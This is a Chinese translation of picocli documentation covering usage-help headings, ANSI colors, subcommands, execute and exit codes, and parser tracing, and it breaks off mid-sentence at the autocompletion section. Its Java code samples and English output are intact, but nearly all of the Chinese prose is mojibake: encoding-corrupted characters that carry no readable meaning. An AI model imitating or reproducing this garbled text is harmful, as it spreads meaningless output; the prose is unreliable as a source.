å­å½ä»¤çä½¿ç¨å¸®å©ï¼ã\n\nä½¿ç¨é¡µèå±æ§æå®ä¸è¡æå¤è¡ï¼ä»¥æ¾ç¤ºå¨çæçä½¿ç¨å¸®å©æ¶æ¯ä¸æ¹ãå±æ§å­ç¬¦ä¸²æ°ç»çæ¯ä¸ªåç´ é½æ¾ç¤ºå¨åç¬çè¡ä¸ã\n\nheaderHeadingåfooterHeadingå¯è½åå«æ ¼å¼è¯´æç¬¦ãè¯·åéé¨åæ é¢ã\n\n# ç« èæ é¢\n\né¨åæ é¢å¯ç¨äºä½¿ä½¿ç¨æ¶æ¯å¸å±çèµ·æ¥æ´å®½æãç« èæ é¢å¯è½åå«åµå¥å¼è¡åéç¬¦ï¼%nï¼æ ¼å¼è¯´æç¬¦ï¼\n\n@Command(name = "commit",\n        sortOptions = false,\n        headerHeading = "Usage:%n%n",\n        synopsisHeading = "%n",\n        descriptionHeading = "%nDescription:%n%n",\n        parameterListHeading = "%nParameters:%n",\n        optionListHeading = "%nOptions:%n",\n        header = "Record changes to the repository.",\n        description = "Stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass GitCommit { ... }\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nä»è¯¥ç±»çæçå¸®å©æ¶æ¯çä½¿ç¨æåµå¦ä¸æç¤ºå¨ç¨æ·æåçæ©å±ç¤ºä¾ä¸­ã\n\n# éé¡¹åæ°åç¦»å¨\n\næ¦è¦ä¸­æ¾ç¤ºçéé¡¹åéé¡¹åæ°ï¼é»è®¤ä¸º=ï¼ä¹é´çåéç¬¦åéé¡¹åè¡¨å¯ä»¥ä½¿ç¨åéç¬¦å±æ§è¿è¡éç½®ã\n\n@Command(separator = ":")\t\n\n\n1\n\n\n# éèéé¡¹ååæ°\n\nå°éèå±æ§è®¾ç½®ä¸ºtrueçéé¡¹ååæ°å°ä¸ä¼æ¾ç¤ºå¨ä½¿ç¨å¸®å©æ¶æ¯ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\n# æ¾ç¤ºé»è®¤å¼\n\néé¡¹æä½ç½®åæ°çé»è®¤å¼å¯ä»¥éè¿å¨æè¿°ææ¬ä¸­æå®åé${DEFAULT-VALUE}åµå¥å°æè¿°ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\nåæ ·ï¼å¯ä»¥éè¿å¨æè¿°ææ¬ä¸­æå®åé${COMPLETION-CANDIDATES}ï¼å°å®æåéèåµå¥å°éé¡¹æä½ç½®åæ°çæè¿°ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåã\n\n# å¿å¡«éé¡¹æ è®°\n\næééé¡¹å¯ä»¥éè¿ä½¿ç¨ requiredOptionMarker å±æ§æå®çå­ç¬¦å¨éé¡¹åè¡¨ä¸­æ è®°ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æå\n\n# æ¾ç¤ºå®½åº¦\n\nä½¿ç¨å¸®å©æ¶æ¯çé»è®¤å®½åº¦ä¸º80ä¸ªå­ç¬¦ãç³»ç»å±æ§picocli.usage.widthå¯ç¨äºæå®èªå®ä¹å®½åº¦ãå¯ä»¥éç½®çæå°å®½åº¦ä¸º55ä¸ªå­ç¬¦ã\n\nå®½åº¦ä¹å¯ä»¥éè¿CommandLine::setUsageHelpWidthåUsageMessageSpec::widthæ¹æ³ä»¥ç¼ç¨æ¹å¼è®¾ç½®ã\n\n\n# ANSIé¢è²åé£æ ¼\n\n\n# å½©è²ç¤ºä¾\n\nä¸é¢æ¾ç¤ºäºä¸ç¨æ·æåä¸­æ©å±ç¤ºä¾ä¸­æ¾ç¤ºçç¸åçä½¿ç¨å¸®å©æ¶æ¯ï¼å¹¶å¯ç¨äºANSIè½¬ä¹ä»£ç ã\n\n\n\n\n# æ ·å¼åé¢è²çä½¿ç¨å¸®å©\n\næ¨å¯ä»¥å¨ä½¿ç¨å¸®å©æ¶æ¯çæè¿°ãé¡µçåé¡µèä¸­ä½¿ç¨é¢è²åæ ·å¼ã\n\nPicocliæ¯æèªå®ä¹æ è®°ç¬¦å·ï¼ç¨äºå¨ææ¬ä¸­æ··åé¢è²åæ ·å¼ï¼éµå¾ªJansiå¼å¥ççº¦å®ï¼å¶ä¸­@|å¼å§ä¸ä¸ªæ ·å¼é¨åï¼|@ç»æå®ãç´§æ¥ç@|æ¯ä¸ä¸ªéå·åéçé¢è²åæ ·å¼åè¡¨ï¼æä»¥@|STYLE1[,STYLE2]...ææ¬|@ãä¾å¦ï¼\n\n@Command(description = "Custom @|bold,underline styles|@ and @|fg(red) colors|@.")\n\n\n1\n\n\n\n\né¢å®ä¹çæ ·å¼åé¢è²è¡¨\n\nPRE-DEFINED STYLES   PRE-DEFINED COLORS\nbold                 black\nfaint                red\nunderline            green\nitalic               yellow\nblink                blue\nreverse              magenta\nreset                cyan\n                     white\n\né»è®¤æåµä¸ï¼é¢è²ä½ä¸ºåæ¯é¢è²åºç¨ãæ¨å¯ä»¥éè¿æå®bgï¼<color>ï¼æ¥è®¾ç½®èæ¯é¢è²ãä¾å¦ï¼çº¢è²èæ¯ç@|bgï¼çº¢è²ï¼ææ¬|@ãåæ ·ï¼fgï¼<color>ï¼æ¾å¼è®¾ç½®åæ¯é¢è²ã\n\nä¸é¢çç¤ºä¾å±ç¤ºäºå¦ä½ä½¿ç¨æ­¤æ è®°ä¸ºä½¿ç¨å¸®å©æ¶æ¯çæ é¢åæè¿°æ·»å é¢è²åæ ·å¼ï¼\n\n@Command(name = "commit",\n        sortOptions = false,\n        headerHeading = "@|bold,underline Usage|@:%n%n",\n        synopsisHeading = "%n",\n        descriptionHeading = "%n@|bold,underline Description|@:%n%n",\n        parameterListHeading = "%n@|bold,underline Parameters|@:%n",\n        optionListHeading = "%n@|bold,underline Options|@:%n",\n        header = "Record changes to the repository.",\n        description = "Stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass GitCommit { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> æ è®°æ ·å¼ä¸è½åµå¥ï¼ä¾å¦ï¼@|bold this @|underline that|@|@å°ä¸èµ·ä½ç¨ãæ¨å¯ä»¥éè¿ç»åæ ·å¼æ¥å®ç°ç¸åçç®æ ï¼ä¾å¦ï¼@|bold this|@ @|boldï¼underline that|@å°æ­£å¸¸å·¥ä½ã\n\n\n# æ´å¤é¢è²\n\nåªæå«ç§é¢å®ä¹çå½åé¢è²ï¼ä½å¤§å¤æ°ç»ç«¯æ¯æ256ç§é¢è²ç´¢å¼è°è²æ¿ãè¯·åéç¨æ·æåçâæ´å¤é¢è²âé¨åï¼ä»¥å°è¿äºé¢è²ç¨ä½åæ¯æèæ¯é¢è²ã\n\n\n\n# åºå®åç´ éè²æ¹æ¡\n\nPicocliå¯¹éé¡¹ãåæ°åå½ä»¤ä½¿ç¨é»è®¤éè²æ¹æ¡ãæ²¡ææ³¨éæ¥ä¿®æ¹æ­¤éè²æ¹æ¡ï¼ä½å¯ä»¥éè¿ç¼ç¨åç³»ç»å±æ§è¿è¡æ´æ¹ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçéè²æ¹æ¡é¨åã\n\n\n# æ¯æçå¹³å°\n\nPicocliåªä¼å¨æ¯æçå¹³å°ä¸åå¸ANSIè½¬ä¹ä»£ç ãè¿åæ¬å¤§å¤æ°UnixåLinuxå¹³å°ãæå³ä¸ºWindowså½ä»¤æ§å¶å°æ·»å çè²æ¯æçåç§éé¡¹ï¼è¯·åéç¨æ·æåçWindowsé¨åã\n\n\n# å¼ºå¶å¼å¯æå³é­ANSI\n\næ è®ºå¹³å°å¦ä½ï¼æ¨é½å¯ä»¥å¼ºå¶picocliå§ç»ä½¿ç¨ANSIä»£ç ææ°¸è¿ä¸ä½¿ç¨ANSIä»£ç ï¼\n\n * å°ç³»ç»å±æ§picocli.ansiè®¾ç½®ä¸ºtrueå¼ºå¶picocliä½¿ç¨ANSIä»£ç ï¼å°picocli.ansiè®¾ç½®ä¸ºfalseå¼ºå¶picocliä¸ä½¿ç¨ANSIä»£ç ãå¯¹äºæ¨çå½ä»¤è¡åºç¨ç¨åºçç¨æ·æ¥è¯´ï¼è¿å¯è½æ¯ä¸ä¸ªæç¨çå·¥å·ã\n\n * æ¨å¯ä»¥éè¿å¨è°ç¨CommandLine.usageæ¶æå®Ansi.ONæAnsi.OFFï¼å³å®ä»¥ç¼ç¨æ¹å¼å¼ºå¶ç¦ç¨æå¼ºå¶å¯ç¨ANSIè½¬ä¹ä»£ç ãè¿è¦çäºç³»ç»å±æ§picocli.ansiçå¼ãä¾å¦ï¼\n\nimport picocli.CommandLine.Help.Ansi;\n\nApp app = CommandLine.usage(new App(), System.out, Ansi.OFF, args);\n\n\n1\n2\n3\n\n\n\n# å­å½ä»¤\n\n\n# æ³¨åå­å½ä»¤\n\nå­å½ä»¤å¯ä»¥ä»¥ç¼ç¨æå£°ææ¹å¼æ³¨å\n\n# ç¼ç¨æ¹å¼\n\nå­å½ä»¤å¯ä»¥ä½¿ç¨CommandLine.addSubcommandæ¹æ³æ³¨åãæ¨ä¼ éå½ä»¤åå¸¦æ³¨è§£çå¯¹è±¡çåç§°ä»¥å¡«åå­å½ä»¤éé¡¹ãè§£æå¨ä½¿ç¨æå®çåç§°æ¥è¯å«å½ä»¤è¡åæ°ä¸­çå­å½ä»¤ã\n\nCommandLine commandLine = new CommandLine(new Git())\n        .addSubcommand("status",   new GitStatus())\n        .addSubcommand("commit",   new GitCommit())\n        .addSubcommand("add",      new GitAdd())\n        .addSubcommand("branch",   new GitBranch())\n        .addSubcommand("checkout", new GitCheckout())\n        .addSubcommand("clone",    new GitClone())\n        .addSubcommand("diff",     new GitDiff())\n        .addSubcommand("merge",    new GitMerge())\n        .addSubcommand("push",     new GitPush())\n        .addSubcommand("rebase",   new GitRebase())\n        .addSubcommand("tag",      new GitTag());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> å³äºèªå®ä¹ç±»åè½¬æ¢å¨çæ³¨æäºé¡¹ï¼èªå®ä¹ç±»åè½¬æ¢å¨ä»æ³¨åå¨èªå®ä¹ç±»åä¹åæ·»å çå­å½ä»¤ååµå¥å­å­å½ä»¤ä¸­ãä¸ºäºç¡®ä¿ææå­å½ä»¤é½å¯ä»¥ä½¿ç¨èªå®ä¹ç±»åè½¬æ¢å¨ï¼è¯·å¨æ·»å å­å½ä»¤åæåæ³¨åç±»åè½¬æ¢å¨ã\n\n# å£°ææ¹å¼\n\nå­å½ä»¤å¯ä»¥å£°ææ§å°ä½¿ç¨@Commandæ³¨éçå­å½ä»¤å±æ§æ³¨åã\n\n@Command(name = "git", subcommands = {\n    GitStatus.class,\n    GitCommit.class,\n    GitAdd.class,\n    GitBranch.class,\n    GitCheckout.class,\n    GitClone.class,\n    GitDiff.class,\n    GitMerge.class,\n    GitPush.class,\n    GitRebase.class,\n    GitTag.class\n})\npublic class Git { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå½æå»ºæ°çCommandLineï¼new Git()ï¼å®ä¾æ¶ï¼å£°æçå­å½ä»¤ä¼èªå¨å®ä¾ååæ·»å ã\n\nå­å½ä»¤å±æ§ä¸­å¼ç¨çå­å½ä»¤å¿é¡»å·æå¸¦æåç§°å±æ§ç@Commandæ³¨éï¼å¦åä»CommandLineæé å½æ°ä¸­æåºå¼å¸¸ã\n\n# åµå¥å­å½ä»¤\n\nå­å½ä»¤å¯ä»¥åµå¥å°ä»»ææ·±åº¦çº§å«ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçåµå¥å­å½ä»¤é¨åã\n\n\n# è§£æå­å½ä»¤\n\nå¯¹äºè¿ä¸ªä¾å­ï¼æä»¬åè®¾æä»¬åå»ºäºä¸ä¸ªå«ågitæ¥è°ç¨æä»¬çJavaåºç¨ç¨åºãè¿ä¹å¯ä»¥æ¯ä¸ä¸ªè°ç¨æä»¬Javaç¨åºçèæ¬æå½æ°ï¼\n\nalias git=\'java picocli.Demo$Git\'\n\n\n1\n\n\næ¥ä¸æ¥ï¼æä»¬ç¨ä»¥ä¸åæ°è°ç¨æä»¬çå½ä»¤ï¼\n\ngit --git-dir=/home/rpopma/picocli status -sb -uno\n\n\n1\n\n\nå¶ä¸­gitï¼å®éä¸æ¯java picocli.Demo$Gitï¼æ¯é¡¶çº§å½ä»¤ï¼å¶æ¬¡æ¯å¨å±éé¡¹åå·æèªèº«éé¡¹çå­å½ä»¤ç¶æã\n\nè®¾ç½®è§£æå¨å¹¶è§£æå½ä»¤è¡å¯è½å¦ä¸æç¤ºï¼\n\npublic static void main(String... args) {\n    // Set up the parser\n    CommandLine commandLine = new CommandLine(new Git());\n\n    // add subcommands programmatically (not necessary if the parent command\n    // declaratively registers the subcommands via annotation)\n    commandLine.addSubcommand("status",   new GitStatus())\n               .addSubcommand("commit",   new GitCommit())\n                ...\n\n    // Invoke the parse method to parse the arguments\n    List<CommandLine> parsed = commandLine.parse(args);\n    handleParseResult(parsed);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nCommandLine.parseæ¹æ³è¿åä¸ä¸ªåå«å¯è¯å«å½ä»¤çåè¡¨ãé¡¶çº§å½ä»¤ï¼å¨æ¬ä¾ä¸­ç±gitè°ç¨çJavaç±»ï¼å§ç»æ¯è¿ååè¡¨ä¸­çç¬¬ä¸ä¸ªåç´ ã\n\nè¿åçåè¡¨è¿åå«ææå¹éçå­å½ä»¤ãæ¨çåºç¨ç¨åºéè¦æ£æ¥æ­¤åè¡¨ï¼ä»¥æ¥çè°ç¨äºåªäºå­å½ä»¤ï¼å¹¶éåéå½çè¡å¨ãä¾å¦ï¼\n\nprivate void handleParseResult(List<CommandLine> parsed) {\n    assert parsed.size() == 2 : "1 command and 1 subcommand found"\n\n    assert parsed.get(0).getCommand().getClass() == Git.class       : "main command"\n    assert parsed.get(1).getCommand().getClass() == GitStatus.class : "subcommand"\n\n    Git git = (Git) parsed.get(0).getCommand();\n    assert git.gitDir.equals(new File("/home/rpopma/picocli"));\n\n    GitStatus gitstatus = (GitStatus) parsed.get(1).getCommand();\n    assert  gitstatus.shortFormat              : "git status -s"\n    assert  gitstatus.branchInfo               : "git status -b"\n    assert !gitstatus.showIgnored              : "git status --showIgnored not specified"\n    assert  gitstatus.mode == GitStatusMode.no : "git status -u=no"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nä»Picocli 4.0å¼å§ï¼æ¨å¯ä»¥ä½¿ç¨æ§è¡æ¹æ³æ¥åå°åºç¨ç¨åºä¸­çéè¯¯å¤çåå¶ä»æ ·æ¿ä»£ç ã\n\n\n# @ParentCommandæ³¨è§£\n\nå¨å·æå­å½ä»¤çå½ä»¤è¡åºç¨ç¨åºä¸­ï¼é¡¶çº§å½ä»¤çéé¡¹éå¸¸ç¨ä½éç¨äºææå­å½ä»¤çâå¨å±âéé¡¹ã@ParentCommandæ³¨éä½¿å­å½ä»¤å¯ä»¥è½»æ¾è®¿é®å¶ç¶å½ä»¤éé¡¹ï¼ç¨@ParentCommandæ³¨éçå­å½ä»¤å­æ®µéè¿å¼ç¨ç¶å½ä»¤è¿è¡åå§åãç¨æ·æåæä¸ä¸ªç¤ºä¾ï¼å±ç¤ºäºå¦ä½ä½¿ç¨@ParentCommandæ³¨éã\n\n\n# å­å½ä»¤çä½¿ç¨å¸®å©\n\næ³¨åå­å½ä»¤åï¼è°ç¨commandLine.usageæ¹æ³å°æ¾ç¤ºä¸æ¡ä½¿ç¨å¸®å©æ¶æ¯ï¼ææ³¨åé¡ºåºåå«ææå­å½ä»¤ãä¾å¦ï¼\n\nUsage: git [-hV] [--git-dir=<gitDir>]\nGit is a fast, scalable, distributed revision control system with an unusually\nrich command set that provides both high-level operations and full access to\ninternals.\n      --git-dir=<gitDir>   Set the path to the repository.\n  -h, --help               Show this help message and exit.\n  -V, --version            Print version information and exit.\n\nCommands:\n\nThe most commonly used git commands are:\n  help      Displays help information about the specified command\n  status    Show the working tree status.\n  commit    Record changes to the repository.\n  add       Add file contents to the index.\n  branch    List, create, or delete branches.\n  checkout  Checkout a branch or paths to the working tree.\n  clone     Clone a repository into a new directory.\n  diff      Show changes between commits, commit and working tree, etc.\n  merge     Join two or more development histories together.\n  push      Update remote refs along with associated objects.\n  rebase    Forward-port local commits to the updated upstream head.\n  tag       Create, list, delete or verify a tag object signed with GPG.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåè¡¨ä¸­å­å½ä»¤çæè¿°åèªå­å½ä»¤çç¬¬ä¸ä¸ªæ é¢è¡ï¼æèï¼å¦æå­å½ä»¤æ²¡ææ é¢æ³¨éï¼ååèªæè¿°ã\n\n# éèçå­å½ä»¤\n\nå°éèå±æ§è®¾ç½®ä¸ºtrueçå½ä»¤ä¸ä¼æ¾ç¤ºå¨å¶ç¶å½ä»¤çä½¿ç¨å¸®å©æ¶æ¯ä¸­ãæå³è¯¦ç»ä¿¡æ¯ï¼è¯·åéç¨æ·æåçéèå­å½ä»¤é¨åã\n\n# å¸®å©å­å½ä»¤\n\nPicocliæä¸ä¸ªåç½®çå¸®å©å­å½ä»¤ï¼ä½å¦ææ¨æå´è¶£åå»ºèªå®ä¹å¸®å©å½ä»¤ï¼è¯·åéç¨æ·æåçå¸®å©å­å½ä»¤é¨åã\n\n\n# éå¤ä½¿ç¨\n\næ¨å¯è½ä¼åç°èªå·±å¨è®¸å¤å½ä»¤è¡åºç¨ç¨åºä¸­å®ä¹äºç¸åçéé¡¹ãåæ°æå½ä»¤å±æ§ãä¸ºäºåå°éå¤ï¼picocliæ¯æå­ç±»åæ··åï¼ä½ä¸ºéç¨æ­¤ç±»éé¡¹åå±æ§çæ¹æ³ã\n\néç¨ä¸è¿°éé¡¹åå±æ§çä¸ç§æ¹æ³æ¯æ©å±ç±»ãPicocliå°èµ°å¨ç±»å±æ¬¡ç»æä¸­æ£æ¥æ³¨éï¼å æ­¤å¨è¶ç±»ä¸å£°æç@Optionsã@Parameterså@Commandå±æ§å¨ææå­ç±»ä¸­é½å¯ç¨ã\n\nå½ä»¤ä¹å¯ä»¥éè¿ç¨@Mixinæ³¨éå­æ®µæ¥åå«mixinãmixinç±»ä¸­åç°çææpicocliæ³¨éé½æ·»å å°å¸¦æ@Mixinæ³¨éå­æ®µçå½ä»¤ä¸­ãä¾å¦ï¼\n\n@Command(name = "zip", description = "Example reuse with @Mixin annotation.")\npublic class MyCommand {\n\n    // adds the options defined in ReusableOptions to this command\n    @Mixin\n    private ReusableOptions myMixin;\n    ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nç¨æ·æåçéç¨é¨åææ´å¹¿æ³çç¤ºä¾ã\n\n\n# æ§è¡å½ä»¤\n\næ§è¡å½ä»¤æ¶ï¼è§£æå½ä»¤è¡æ¯ç¬¬ä¸æ­¥ãä¸ä¸ªå¼ºå¤§çç°å®ä¸çåºç¨ç¨åºéè¦å¤çè®¸å¤åºæ¯ï¼\n\n * ç¨æ·è¾å¥æ æï¼æ¾ç¤ºæè¿°é®é¢çéè¯¯ï¼å¹¶æ¾ç¤ºä½¿ç¨å¸®å©\n\n * ç¨æ·è¯·æ±çä½¿ç¨å¸®å©ï¼æ¾ç¤ºå¸®å©æ¶æ¯å¹¶éåº\n\n * ç¨æ·è¯·æ±ççæ¬å¸®å©ï¼æ¾ç¤ºçæ¬ä¿¡æ¯åéåº\n\n * ä»¥ä¸é½ä¸æ¯ï¼è¿è¡ä¸å¡é»è¾ï¼å¯è½ç¨äºå­å½ä»¤ï¼\n\n * ä¸å¡é»è¾å¯è½ä¼æåºå¼å¸¸ï¼å¤çæéæ°æåºå¼å¸¸\n\nä»Piocli 4.0èµ·ï¼æ¨å¯ä»¥ä½¿ç¨Commandline.executeæ¹æ³ï¼è¯¥æ¹æ³å¨ä¸è¡ä»£ç ä¸­å¤çä¸è¿°ææåºæ¯ï¼\n\nnew CommandLine(new MyApp()).execute(args);\n\n\n1\n\n\nä½¿ç¨æ§è¡æ¹æ³ï¼åºç¨ç¨åºä»£ç å¯ä»¥éå¸¸ç´§åï¼\n\n@Command(name = "myapp", mixinStandardHelpOptions = true, version = "1.0")\nclass MyApp implements Callable<Integer> {\n\n    @Option(names = "-x") int x;\n\n    @Override\n    public Integer call() { // business logic\n        System.out.printf("x=%s%n", x);\n        return 123; // exit code\n    }\n\n    public static void main(String... args) { // bootstrap the application\n        System.exit(new CommandLine(new MyApp()).execute(args));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°½ç®¡åªæ15è¡é¿ï¼ä½è¿æ¯ä¸ä¸ªæççåºç¨ç¨åºï¼é¤äº-xéé¡¹å¤ï¼è¿æ--helpå--versionéé¡¹ãå¦æç¨æ·è¦æ±ï¼æ§è¡æ¹æ³å°æ¾ç¤ºä½¿ç¨å¸®å©æçæ¬ä¿¡æ¯ï¼æ æçç¨æ·è¾å¥å°å¯¼è´æç¨çéè¯¯æ¶æ¯ãå¦æç¨æ·è¾å¥ææï¼åè°ç¨ä¸å¡é»è¾ãæåï¼æ§è¡æ¹æ³è¿åä¸ä¸ªéåºç¶æä»£ç ï¼å¦æéè¦ï¼å¯ç¨äºè°ç¨System.exitã\n\nç¨æ·æåçDIYå½ä»¤æ§è¡é¨åæ¾ç¤ºäºæ§è¡æ¹æ³å¯ä»¥çç¥çæ ·æ¿ä»£ç ç¤ºä¾ã\n\n\n# éåºä»£ç \n\nè®¸å¤å½ä»¤è¡åºç¨ç¨åºè¿åéåºä»£ç ï¼ä»¥è¡¨ç¤ºæåæå¤±è´¥ãé¶éå¸¸æå³çæåï¼éé¶éåºä»£ç éå¸¸ç¨äºéè¯¯ï¼ä½é¤æ­¤ä¹å¤ï¼æ¯ä¸ªåºç¨ç¨åºçå«ä¹ä¸åã\n\nPicocli 4.0ä¸­å¼å¥çCommandLine.executeæ¹æ³è¿åä¸ä¸ªintï¼å¦æéè¦ï¼åºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤è¿åå¼è°ç¨System.exitãä¾å¦ï¼\n\npublic static void main(String... args) {\n  int exitCode = new CommandLine(new MyApp()).execute(args);\n  System.exit(exitCode);\n}\n\n\n1\n2\n3\n4\n\n\n> æ§çæ¬çpicocliæä¸äºæéçéåºä»£ç æ¯æï¼picocliä¼è°ç¨System.exitï¼ä½ç°å¨ä¸å»ºè®®ä½¿ç¨ã\n\n\n# çæéåºä»£ç \n\nå®ç°Callableå¹¶ä¸æ·»å äº@Commandæ³¨è§£çæ¹æ³å@Commandæ³¨è§£çç±»å¯ä»¥ç®åå°è¿åintææ´æ°ï¼æ­¤å¼å°ä»CommandLine.executeè¿åãä¾å¦ï¼\n\n@Command(name = "greet")\nclass Greet implements Callable<Integer> {\n    public Integer call() {\n        System.out.println("hi");\n        return 1;\n    }\n\n    // define a "shout" subcommand with a @Command-annotated method\n    @Command\n    int shout() {\n        System.out.println("HI!");\n        return 2;\n    }\n}\n\nassert 1 == new CommandLine(new Greet()).execute();\nassert 2 == new CommandLine(new Greet()).execute("shout");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nä½¿ç¨å®ç°Runnableçç¨æ·å¯¹è±¡çå½ä»¤å¯ä»¥å®ç°IExitCodeGeneratoræ¥å£æ¥çæéåºä»£ç ã\n\n\n# ä¾å¤éåºä»£ç \n\né»è®¤æåµä¸ï¼æ§è¡æ¹æ³æåæ¶è¿åCommandLine.ExitCode.OK (0)ï¼å¨RunableãCallableæå½ä»¤æ¹æ³ä¸­åçå¼å¸¸æ¶è¿åCommandLine.ExitCode.SOFTWAREï¼1ï¼ï¼ä»¥åæ æè¾å¥çCommandLine.ExitCode.USAGEï¼2ï¼ãï¼æ ¹æ®è¿ä¸ªStackOverflowç­æ¡ï¼è¿äºæ¯å¸¸è§çå¼ï¼ãè¿å¯ä»¥éè¿@Commandæ³¨éè¿è¡èªå®ä¹ãä¾å¦ï¼\n\n@Command(exitCodeOnInvalidInput = 123,\n   exitCodeOnExecutionException = 456)\n\n\n1\n2\n\n\næ­¤å¤ï¼åºç¨ç¨åºå¯ä»¥éç½®IExitCodeExceptionMapperå°ç¹å®å¼å¸¸æ å°å°éåºä»£ç ã\n\n\n# æ§è¡éç½®\n\nè½ç¶æ§è¡æ¹æ³åè®¸å¨ä¸è¡ä»£ç ä¸­è¿è¡CLIåºç¨ç¨åºï¼ä½å½ä»¤æ§è¡çåä¸ªæ­¥éª¤é½æ¯é«åº¦å¯éç½®çãä»¥ä¸æ¹æ³å¯ç¨äºéç½®æ§è¡æ¹æ³çè¡ä¸ºï¼æ¨å¯ä»¥ä½¿ç¨å®ä»¬æ¥è°æ´å½ä»¤æ§è¡ä»¥æ»¡è¶³æ¨çéæ±ï¼\n\n * get/setOut\n * get/setErr\n * get/setColorScheme\n * get/setExecutionStrategy\n * get/setParameterExceptionHandler\n * get/setExecutionExceptionHandler\n * get/setExitCodeExceptionMapper\n\n> ä¸è¿°æ¹æ³ä¸éç¨äºï¼å¹¶è¢«å¿½ç¥ï¼å¶ä»å¥å£ç¹ï¼å¦parseãparseArgsãpopulateCommandãrunãcallãè°ç¨ãparseWithHandleråparseWithHandlersã\n\n\n# å¤çéè¯¯\n\nå¨åé¨ï¼æ§è¡æ¹æ³è§£ææå®çç¨æ·è¾å¥ï¼å¹¶å¡«åæ³¨éå®ä¹çéé¡¹åä½ç½®åæ°ãå½ç¨æ·æå®æ æè¾å¥æ¶ï¼ç±IParameterExceptionHandlerå¤çã\n\nè§£æç¨æ·è¾å¥åï¼å°è°ç¨å½ä»¤çä¸å¡é»è¾ï¼è¿è¡ãè°ç¨æ@Command-annotatedæ¹æ³ãå½ä¸å¡é»è¾æåºå¼å¸¸æ¶ï¼ç±IExecutionExceptionHandlerå¤çã\n\nå¨å¤§å¤æ°æåµä¸ï¼é»è®¤å¤çç¨åºå°±è¶³å¤äºãå¨ç¨æ·æåçå¤çéè¯¯é¨åæ·±å¥è§£éäºé»è®¤å¤çç¨åºçèªå®ä¹ã\n\n\n# è¿ç§»\n\næ§çæ¬çpicocliæ¯æè¿è¡ãè°ç¨ãè°ç¨åparseWithHandlersæ¹ä¾¿æ¹æ³ï¼è¿äºæ¹æ³ç±»ä¼¼äºæ§è¡ï¼ä½å¯¹è§£æå¨éç½®çæ¯ææéï¼å¯¹éåºä»£ç çæ¯ææéãä»picocli 4.0ä¸­ï¼è¿äºæ¹æ³å·²è¢«å¼ç¨ã\n\nç¨æ·æåçè¿ç§»é¨åå¯å¸®å©æ¨å°ç°æä»£ç è¿ç§»å°æ°å¼å¥çæ§è¡API\n\n\n# è¿½è¸ª\n\nPicocliæ¯æè§£æå¨è·è¸ªï¼ä»¥æ¹ä¾¿æéæé¤ãç³»ç»å±æ§picocli.traceæ§å¶è·è¸ªçº§å«ãæ¯æççº§å«åæ¬OFFãWARNãINFOåDEBUGãé»è®¤è·è¸ªçº§å«ä¸ºWARNã\n\næå®æ²¡æå¼çç³»ç»å±æ§-Dpicocli.traceå°æè·è¸ªçº§å«è®¾ç½®ä¸ºINFOã\n\n * DEBUGï¼æ¾ç¤ºè§£æå¨å¨å½ä»¤è¡è§£ææé´æä½å³å®çè¯¦ç»ä¿¡æ¯ã\n\n * INFOï¼æ¾ç¤ºå½ä»¤è¡è§£ææé´åççäºæçé«çº§æ¦è¿°ã\n\n * WARNï¼é»è®¤å¼ãå¯ç¨å®½æ¾è§£ææ¶æ¾ç¤ºè­¦åèä¸æ¯éè¯¯ï¼å½å¤æ¬¡æå®åå¼éé¡¹ï¼CommandLine.overwrittenOptionsAllowedä¸ºçï¼æå½ä»¤è¡åæ°æ æ³å¹éä¸ºéé¡¹æä½ç½®åæ°æ¶ï¼CommandLine.unmatchedArgumentsAllowedä¸ºçï¼ã\n\n * OFFï¼ç¦æ­¢ææè·è¸ªï¼åæ¬è­¦åã\n\nç¤ºä¾ï¼\n\n# create a custom \'mygit\' command that invokes picocli.Demo$Git with tracing switched on\nalias mygit=\'java -Dpicocli.trace -cp picocli-all.jar picocli.Demo$Git\'\n\n# invoke our command with some parameters\nmygit --git-dir=/home/rpopma/picocli commit -m "Fixed typos" -- src1.java src2.java src3.java\n\n\n1\n2\n3\n4\n5\n\n\nè¾åºï¼\n\n[picocli INFO] Parsing 8 command line args [--git-dir=/home/rpopma/picocli, commit, -m, "Fixed typos", --, src1.java, src2.java, src3.java]\n[picocli INFO] Setting File field \'Git.gitDir\' to \'\\home\\rpopma\\picocli\' for option --git-dir\n[picocli INFO] Adding [Fixed typos] to List&lt;String> field \'GitCommit.message\' for option -m\n[picocli INFO] Found end-of-options delimiter \'--\'. Treating remainder as positional parameters.\n[picocli INFO] Adding [src1.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n[picocli INFO] Adding [src2.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n[picocli INFO] Adding [src3.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# èªå¨è¡¥å¨\n\nåºäºPicocliçåºç¨ç¨åºç°å¨å¯ä»¥å¨BashæZsh Unix shellä¸­å®æå½ä»¤è¡ãè¯·åé